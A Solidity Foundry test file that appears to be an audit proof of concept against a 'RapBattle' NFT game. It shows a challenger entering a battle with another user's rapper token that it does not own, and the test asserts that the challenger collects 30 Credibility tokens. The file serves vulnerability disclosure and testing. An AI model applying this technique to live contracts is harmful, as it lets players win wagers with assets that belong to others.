// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console, Vm} from "../lib/forge-std/src/Test.sol";
import {RapBattle} from "../src/RapBattle.sol";
import {OneShot} from "../src/OneShot.sol";
import {Streets} from "../src/Streets.sol";
import {Credibility} from "../src/CredToken.sol";
import {IOneShot} from "../src/interfaces/IOneShot.sol";

contract RapBattleTest is Test {
    RapBattle rapBattle;
    OneShot oneShot;
    Streets streets;
    Credibility cred;
    IOneShot.RapperStats stats;
    address user;
    address challenger;

    function setUp() public {
        oneShot = new OneShot();
        cred = new Credibility();
        streets = new Streets(address(oneShot), address(cred));
        rapBattle = new RapBattle(address(oneShot), address(cred));
        user = makeAddr("Alice");
        challenger = makeAddr("Slim Shady");

        oneShot.setStreetsContract(address(streets));
        cred.setStreetsContract(address(streets));
    }

    // mint rapper modifier
    modifier mintRapper() {
        vm.prank(user);
        oneShot.mintRapper();
        _;
    }

    function testWinBattleByUsingOthersNftRapper() public{
        
        address bobAddr = makeAddr("Bob");
        vm.startPrank(bobAddr);
        oneShot.mintRapper();
        oneShot.approve(address(rapBattle), 0);
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        vm.warp( block.timestamp + 100 days);
        streets.unstake(0);
        vm.stopPrank();



        vm.startPrank(user);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 1);
        streets.stake(1);
        vm.warp( block.timestamp + 5 days);
        streets.unstake(1);

        oneShot.approve(address(rapBattle), 1);
        cred.approve(address(rapBattle), 3);
        rapBattle.goOnStageOrBattle(1, 3);
        vm.stopPrank();

        vm.startPrank(challenger);
        rapBattle.goOnStageOrBattle(0, 3);

        assert(cred.balanceOf( challenger) == 30);
    }
}